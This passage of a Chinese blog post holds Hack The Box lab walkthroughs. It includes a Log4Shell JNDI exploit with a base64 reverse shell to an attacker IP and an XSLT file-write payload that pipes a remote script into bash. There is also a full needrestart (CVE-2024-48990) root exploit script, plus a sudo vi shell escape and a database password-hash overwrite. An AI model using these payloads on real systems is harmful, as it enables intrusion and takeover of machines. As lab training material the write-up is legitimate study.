+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">sudo &#x2F;bin&#x2F;vi &#x2F;etc&#x2F;postgresql&#x2F;11&#x2F;main&#x2F;pg_hba.conf</code></pre>
+
+<p>然后要确保不在编辑模式，输入命令</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">:!&#x2F;bin&#x2F;bash</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002146-dmqa49b.png" alt="image"></p>
+<p>然后就进到 root 的 shell 当中</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002148-pbzykqm.png" alt="image"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002149-rjbfssw.png" alt="image"></p>
+<p>‍</p>
+<p>‍</p>
+<h2 id="Unified"><a href="#Unified" class="headerlink" title="Unified"></a>Unified</h2><blockquote>
+<p>Which are the first four open ports?</p>
+<p>最先开放的四个端口是哪四个？</p>
+</blockquote>
+<p><code>22,6789,8080,8443</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002152-79imq5v.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>What is the title of the software that is running running on port 8443?</p>
+<p>运行在 8443 端口上的软件名称是什么？</p>
+</blockquote>
+<p><code>unifi network</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002156-iimg3z7.png" alt="image"></p>
+<blockquote>
+<p>What is the version of the software that is running?</p>
+<p>当前运行的软件版本是什么？</p>
+</blockquote>
+<p><code>6.4.54</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002154-zufgrw5.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>What is the CVE for the identified vulnerability?</p>
+<p>已识别漏洞的 CVE 编号是多少？</p>
+</blockquote>
+<p>直接开搜</p>
+<p><code>CVE-2021-44228</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002158-8rv3u95.png" alt="image"></p>
+<p>这里就是要利用这个漏洞来渗透，利用的是 <code>log4j2</code> 漏洞</p>
+<p>准备工具</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">sudo apt-get install openjdk-11-jdk -y
+sudo apt-get install maven -y
+git clone https:&#x2F;&#x2F;github.com&#x2F;veracode-research&#x2F;rogue-jndi
+cd rogue-jndi
+mvn package</code></pre>
+
+<p>这里捣鼓了半天，我只有 wsl 是能连上 vpn 的，所以用不了抓包工具，最后没办法只能用 python 实现了</p>
+<p>一开始使用这个代码尝试，在 remember 里有漏洞</p>
+<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">import requests 
+import json 
+
+url &#x3D; &#39;https:&#x2F;&#x2F;10.129.63.30:8443&#x2F;api&#x2F;login&#39;
+
+payload &#x3D; &#123;
+    &quot;username&quot;:&quot;1&quot;,
+    &quot;password&quot;:&quot;1&quot;,
+    &quot;remember&quot;:&quot;$&#123;jndi:ldap:&#x2F;&#x2F;10.10.16.29&#x2F;o&#x3D;tomcat&#125;&quot;,
+    &quot;strict&quot;:True
+&#125;
+
+try:
+    print(&quot;发送请求&quot;)
+    response &#x3D; requests.post(
+        url,
+        json&#x3D;payload,
+        verify&#x3D;False
+    )
+    print(response.status_code)
+    for key,value in response.headers.items():
+        print(key + &quot;:&quot; + value)
+
+    print(response.text)
+
+except requests.exceptions.RequestException as e:
+    print(e)</code></pre>
+
+<p>利用前面那个工具，先将反弹 shell 命令加密一下</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">echo &quot;&#x2F;bin&#x2F;bash -c &#39;&#x2F;bin&#x2F;bash -i &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;10.10.16.29&#x2F;4444 0&gt;&amp;1&#39;&quot; | base64</code></pre>
+
+<p>然后使用工具，然后将脚本中的 remember 参数改成这里的 <code>ldap://10.10.16.29:1389/o=tomcat</code></p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">java -jar RogueJndi-1.1.jar --command &quot;bash -c &#123;echo,L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYvZGV2L3RjcC8xMC4xMC4xNi4yOS80NDQ0IDA+JjEnCg&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; --hostname &quot;10.10.16.29&quot;</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002201-o1x42iv.png" alt="image"></p>
+<p>发送请求</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002203-468m030.png" alt="image"></p>
+<p>监听的地方成功反弹 shell </p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002205-w2ldf4d.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>What protocol does JNDI leverage in the injection?</p>
+<p>JNDI 在注入过程中使用什么协议？</p>
+</blockquote>
+<p><code>ldap</code></p>
+<p>‍</p>
+<blockquote>
+<p>What tool do we use to intercept the traffic, indicating the attack was successful?</p>
+<p>我们使用什么工具来拦截流量，从而判断攻击是否成功？</p>
+</blockquote>
+<p><code>TcpDump</code></p>
+<p>‍</p>
+<blockquote>
+<p>What port do we need to inspect intercepted traffic for?</p>
+<p>我们需要检查截获的流量来自哪个端口？</p>
+</blockquote>
+<p>这里提示是 ldap 的默认端口，搜一下就是</p>
+<p><code>389</code></p>
+<p>‍</p>
+<blockquote>
+<p>What port is the MongoDB service running on?</p>
+<p>MongoDB 服务运行在哪个端口上？</p>
+</blockquote>
+<p>读配置文件可以读到</p>
+<p><code>27117</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002208-9q9tlml.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>What is the default database name for UniFi applications?</p>
+<p>UniFi 应用程序的默认数据库名称是什么？</p>
+</blockquote>
+<p>我一开始以为在外面就可以连接了（</p>
+<p>结果是在靶机内连接就行</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">mongo --host 127.0.0.1 --port 27117</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002210-o0bo60b.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>What is the function we use to enumerate users within the database in MongoDB?</p>
+<p>在 MongoDB 中，我们使用什么函数来枚举数据库中的用户？</p>
+</blockquote>
+<p>很神秘，一开始以为之间是 users，没想到是 admin（</p>
+<p><code>db.admin.find()</code></p>
+<p>‍</p>
+<blockquote>
+<p>What is the function we use to update users within the database in MongoDB?</p>
+<p>在 MongoDB 数据库中，我们使用什么函数来更新数据库中的用户？</p>
+</blockquote>
+<p><code>db.admin.update()</code></p>
+<p>‍</p>
+<blockquote>
+<p>What is the password for the root user?</p>
+<p>root 用户的密码是什么？</p>
+</blockquote>
+<p>想爆破了（，结果提示就是无法爆破</p>
+<p>根据上面的提示，这里应该是想让我们修改这个哈希值，这个哈希是 <code>sha512</code></p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">mkpasswd -m sha-512 admin123</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002212-9sxzxmd.png" alt="image"></p>
+<p>然后修改这个，这里可以看到修改成功了，然后返回网站用这个密码登录</p>
+<pre class="line-numbers language-mongo" data-language="mongo" data-start="1"><code class="language-mongo">db.admin.update(&#123;&quot;_id&quot; : ObjectId(&quot;61ce278f46e0fb0012d47ee4&quot;)&#125;,&#123;$set:&#123;&quot;x_shadow&quot;:&quot;$6$DGdDVl6k&#x2F;c8MxNrm$7YHwUEXGB68WF08l5xhaRdMDp4DaZof5qGnA2uE9x07QDHko2dms18MewS6HccSLWwmVjx8QdoGapDb7W&#x2F;YPo.&quot;&#125;&#125;)</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002214-j4iilvb.png" alt="image"></p>
+<p>最后在网站是设置中可以看到这个密码</p>
+<p><code>NotACrackablePassword4U2022</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002217-j39fw55.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>flag</p>
+</blockquote>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002218-19s0wld.png" alt="image"></p>
+<p>‍</p>
+<p>‍</p>
+<h2 id="Conversor"><a href="#Conversor" class="headerlink" title="Conversor"></a>Conversor</h2><pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">nmap -sV 10.10.11.92</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002220-zzzm6kg.png" alt="image"></p>
+<p>发现 80 端口，这里跳转了域名，要改一下 hosts </p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">sudo nano &#x2F;etc&#x2F;hosts
+# 10.10.11.92     conversor.htb</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002222-870w5ij.png" alt="image"></p>
+<p>先扫一下路由，扫到一个 <code>/about</code> ，访问一下试试</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002223-3rq7mes.png" alt="image"></p>
+<p>好像不用登录就能访问进来了，下载源码</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002225-j00fq91.png" alt="image"></p>
+<p>这里感觉漏洞点在一个 <code>xslt</code> 上传的地方，但是利用网上的 payload 都没什么用</p>
+<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">@app.route(&#39;&#x2F;convert&#39;, methods&#x3D;[&#39;POST&#39;])
+def convert():
+    if &#39;user_id&#39; not in session:
+        return redirect(url_for(&#39;login&#39;))
+    xml_file &#x3D; request.files[&#39;xml_file&#39;]
+    xslt_file &#x3D; request.files[&#39;xslt_file&#39;]
+    from lxml import etree
+    xml_path &#x3D; os.path.join(UPLOAD_FOLDER, xml_file.filename)
+    xslt_path &#x3D; os.path.join(UPLOAD_FOLDER, xslt_file.filename)
+    xml_file.save(xml_path)
+    xslt_file.save(xslt_path)
+    try:
+        parser &#x3D; etree.XMLParser(resolve_entities&#x3D;False, no_network&#x3D;True, dtd_validation&#x3D;False, load_dtd&#x3D;False)
+        xml_tree &#x3D; etree.parse(xml_path, parser)
+        xslt_tree &#x3D; etree.parse(xslt_path)
+        transform &#x3D; etree.XSLT(xslt_tree)
+        result_tree &#x3D; transform(xml_tree)
+        result_html &#x3D; str(result_tree)
+        file_id &#x3D; str(uuid.uuid4())
+        filename &#x3D; f&quot;&#123;file_id&#125;.html&quot;
+        html_path &#x3D; os.path.join(UPLOAD_FOLDER, filename)
+        with open(html_path, &quot;w&quot;) as f:
+            f.write(result_html)
+        conn &#x3D; get_db()
+        conn.execute(&quot;INSERT INTO files (id,user_id,filename) VALUES (?,?,?)&quot;, (file_id, session[&#39;user_id&#39;], filename))
+        conn.commit()
+        conn.close()
+        return redirect(url_for(&#39;index&#39;))
+    except Exception as e:
+        return f&quot;Error: &#123;e&#125;&quot; </code></pre>
+
+<p>这里没看出来怎么打，看的 <a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_65785435/article/details/154151518">HTB Conversor靶机实战记录：从XSLT沙箱逃逸到Root权限_xslt 攻击-CSDN博客</a> 学习</p>
+<p>在这个代码中可以看到没有禁用 <code>EXSLT</code> 扩展，这里确实没见过（</p>
+<blockquote>
+<p><code>EXSLT</code>​ 是 <code>xslt</code> 的拓展标准，提供一些实用的函数</p>
+<p>这里有一个 <code>shell</code>​ 模块，他的 <code>document</code> 函数可以实现任意文件写入</p>
+</blockquote>
+<p>同时在 install.md 中有一个定时任务，就是不断执行 scripts 文件夹下的 py 脚本</p>
+<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">www-data for f in &#x2F;var&#x2F;www&#x2F;conversor.htb&#x2F;scripts&#x2F;*.py; do python3 &quot;$f&quot;; done</code></pre>
+
+<p>payload</p>
+<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;
+&lt;xsl:stylesheet
+    version&#x3D;&quot;1.0&quot;
+    xmlns:xsl&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;XSL&#x2F;Transform&quot;
+    xmlns:shell&#x3D;&quot;http:&#x2F;&#x2F;exslt.org&#x2F;common&quot;
+    extension-element-prefixes&#x3D;&quot;shell&quot;&gt;
+	&lt;!-- 用来匹配所有根节点，这样所有根节点都能触发 --&gt;
+    &lt;xsl:template match&#x3D;&quot;&#x2F;&quot;&gt;
+		&lt;!-- 这里是将文件写入这个位置 --&gt;
+        &lt;shell:document href&#x3D;&quot;&#x2F;var&#x2F;www&#x2F;conversor.htb&#x2F;scripts&#x2F;shell.py&quot; method&#x3D;&quot;text&quot;&gt;
+import os
+os.system(&quot;curl 10.10.17.88:8888&#x2F;shell.sh|bash&quot;)
+        &lt;&#x2F;shell:document&gt;
+    &lt;&#x2F;xsl:template&gt;
+&lt;&#x2F;xsl:stylesheet&gt;</code></pre>
+
+<p>成功了</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002228-wk16eax.png" alt="image"></p>
+<p>进来之后可以先看看之前下载源码时就看到的一个 db 文件，下载下来的打不开，确认是 <code>SQLite 3</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002229-4type58.png" alt="image"></p>
+<p>那直接打开</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">sqlite3 users.db
+
+# 查看所有数据表
+.tables 
+# 读取数据
+SELECT * FROM users;</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002231-j2r7d37.png" alt="image"></p>
+<p>这里尝试了一下，只有第一个用户存在，爆破哈希</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002232-4bim9xm.png" alt="image"></p>
+<p>那就用这个用户 ssh 直接连接上去了</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002234-k4feid6.png" alt="image"></p>
+<p>这里找到了第一个 flag ，并且看到有一个文件无需密码就能用</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002236-bcm73gt.png" alt="image"></p>
+<p>可以看到这个文件的版本 3.7</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002238-gda25de.png" alt="image"></p>
+<p>发现 <code>CVE-2024-48990</code> 刚好就是干这个的，那就直接用</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002239-djabu9z.png" alt="image"></p>
+<p>这里在网上找到的几个 payload 都需要 gcc 编译，但这个靶机上又没有（，所以最后直接用了博客中的 sh 脚本</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">#!&#x2F;bin&#x2F;bash
+ 
+echo &quot;[+] 启动exploit...&quot;
+ 
+# 创建必要的目录结构
+mkdir -p &#x2F;home&#x2F;fismathack&#x2F;exploit&#x2F;importlib
+ 
+# 创建恶意模块
+cat &gt; &#x2F;home&#x2F;fismathack&#x2F;exploit&#x2F;importlib&#x2F;__init__.py &lt;&lt; &#39;END&#39;
+import os
+import subprocess
+import sys
+ 
+# 禁用输出缓冲
+sys.stderr &#x3D; sys.stdout
+ 
+def root_exploit():
+    if os.geteuid() &#x3D;&#x3D; 0:
+        
+        shell_path &#x3D; &quot;&#x2F;home&#x2F;fismathack&#x2F;root_shell&quot;
+        
+        # 复制bash并重命名
+        subprocess.run([&quot;&#x2F;bin&#x2F;cp&quot;, &quot;&#x2F;bin&#x2F;bash&quot;, shell_path], capture_output&#x3D;True)
+        
+        # 设置SUID
+        subprocess.run([&quot;&#x2F;bin&#x2F;chmod&quot;, &quot;4755&quot;, shell_path], capture_output&#x3D;True)
+        os.chmod(shell_path, 0o4755)
+        
+        # 创建成功标志
+        open(&quot;&#x2F;home&#x2F;fismathack&#x2F;exploit_success&quot;, &quot;w&quot;).close()
+ 
+root_exploit()
+END
+ 
+# 监控脚本
+cat &gt; &#x2F;home&#x2F;fismathack&#x2F;exploit&#x2F;nuii.py &lt;&lt; &#39;END&#39;
+import time
+import os
+import subprocess
+import sys
+ 
+# 禁用Python输出缓冲
+sys.stdout &#x3D; sys.stderr
+print(&quot;[+] 启动提权监控...&quot;, flush&#x3D;True)
+ 
+def start_suid_shell():
+    shell_path &#x3D; &quot;&#x2F;home&#x2F;fismathack&#x2F;root_shell&quot;
+    if os.path.exists(shell_path) and os.stat(shell_path).st_mode &amp; 0o4000:
+        print(f&quot;[+] 找到SUID shell: &#123;shell_path&#125;&quot;, flush&#x3D;True)
+        
+        # 检查文件权限
+        import stat
+        file_mode &#x3D; os.stat(shell_path).st_mode
+        print(f&quot;[+] 文件权限: &#123;oct(file_mode)&#125;&quot;, flush&#x3D;True)
+        
+        print(&quot;[+] SUID shell工作正常,启动交互式shell...&quot;, flush&#x3D;True)
+        
+        # 设置环境
+        env &#x3D; os.environ.copy()
+        env[&#39;PS1&#39;] &#x3D; &#39;nuii# &#39;
+        env[&#39;TERM&#39;] &#x3D; &#39;xterm&#39;
+        
+        # 启动完整的交互式shell
+        os.execl(shell_path, &quot;root_shell&quot;, &quot;-p&quot;)
+        return True
+    return False
+ 
+print(f&quot;[+] 监控PID: &#123;os.getpid()&#125;&quot;, flush&#x3D;True)
+print(&quot;[*] 触发系统服务...&quot;, flush&#x3D;True)
+ 
+# 触发服务
+for trigger in [&quot;sudo &#x2F;usr&#x2F;sbin&#x2F;needrestart&quot;, &quot;sudo systemctl daemon-reload&quot;]:
+    try:
+        subprocess.run(trigger.split(), timeout&#x3D;2, capture_output&#x3D;True)
+    except:
+        pass
+ 
+# 等待并执行
+timeout &#x3D; 30
+start_time &#x3D; time.time()
+ 
+while time.time() - start_time &lt; timeout:
+    try:
+        import importlib
+        print(&quot;[+] 恶意模块执行成功!&quot;, flush&#x3D;True)
+    except Exception as e:
+        pass
+    
+    if os.path.exists(&quot;&#x2F;home&#x2F;fismathack&#x2F;exploit_success&quot;):
+        print(&quot;[+] 提权成功! 启动shell...&quot;, flush&#x3D;True)
+        time.sleep(1)
+        
+        if start_suid_shell():
+            break
+    
+    time.sleep(0.5)
+END
+ 
+# 执行 - 使用无缓冲模式
+echo &quot;[+] 开始提权...&quot;
+cd &#x2F;home&#x2F;fismathack&#x2F;exploit
+PYTHONPATH&#x3D;&quot;&#x2F;home&#x2F;fismathack&#x2F;exploit&quot; python3 -u &#x2F;home&#x2F;fismathack&#x2F;exploit&#x2F;nuii.py</code></pre>
+
+<p>这里输入没有显示的（</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002246-e94eqo2.png" alt="image"></p>
+<p>‍</p>
+<h2 id="Expressway"><a href="#Expressway" class="headerlink" title="Expressway"></a>Expressway</h2><p>扫出来只有 22 端口一脸懵逼</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204002247-xce4w1w.png" alt="image"></p>
+<p>然后才知道原来这个只扫了 tcp 端口，还有 udp 端口</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Marin</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://wwwmarin.xyz/2025/08/27/hackthebox/">https://wwwmarin.xyz/2025/08/27/hackthebox/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Marin</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/web/">
+                                    <span class="chip bg-color">web</span>
+                                </a>
+                            
+                                <a href="/tags/%E5%88%B7%E9%A2%98/">
+                                    <span class="chip bg-color">刷题</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2025/08/27/ctfshow-xxe/">
+                    <div class="card-image">
+                        
+                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/1647056042390.jpg" class="responsive-img" alt="CTFSHOW-XXE">
+                        
+                        <span class="card-title">CTFSHOW-XXE</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2025-08-27
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTFSHOW/" class="post-category">
+                                    CTFSHOW
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web/">
+                        <span class="chip bg-color">web</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%88%B7%E9%A2%98/">
+                        <span class="chip bg-color">刷题</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2025/08/01/ctfshow-jwt/">
+                    <div class="card-image">
+                        
+                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/C48D0E0116BE1A22224E9F6E7048BDCA.jpg" class="responsive-img" alt="CTFSHOW-JWT">
+                        
+                        <span class="card-title">CTFSHOW-JWT</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-08-01
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTFSHOW/" class="post-category">
+                                    CTFSHOW
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web/">
+                        <span class="chip bg-color">web</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%88%B7%E9%A2%98/">
+                        <span class="chip bg-color">刷题</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4, h5, h6'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2026</span>
+            
+            <a href="/about" target="_blank">Marin</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
